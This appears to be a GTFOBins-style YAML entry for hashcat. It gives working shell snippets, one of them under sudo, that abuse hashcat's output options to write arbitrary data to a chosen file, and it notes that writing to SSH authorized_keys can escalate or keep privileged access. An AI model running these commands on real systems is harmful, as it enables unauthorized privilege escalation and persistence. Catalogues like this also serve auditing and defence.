---
description: It can append data to the end of existing files or create new files. Writing to SSH `authorized_keys` may be used to escalate or maintain privileged access.
functions:
  file-write:
    - code: |
        LFILE=file_to_write
        echo -n "DATA" > wordlist && echo -n "DATA" | md5sum | awk '{print $1}' > hash
        hashcat -m 0 -a 0 --quiet --potfile-disable -o "$LFILE" --outfile-format=2 --outfile-autohex-disable hash wordlist
  sudo:
    - code: |
        LFILE=file_to_write
        echo -n "DATA" > wordlist && echo -n "DATA" | md5sum | awk '{print $1}' > hash
        sudo hashcat -m 0 -a 0 --quiet --potfile-disable -o "$LFILE" --outfile-format=2 --outfile-autohex-disable hash wordlist
---
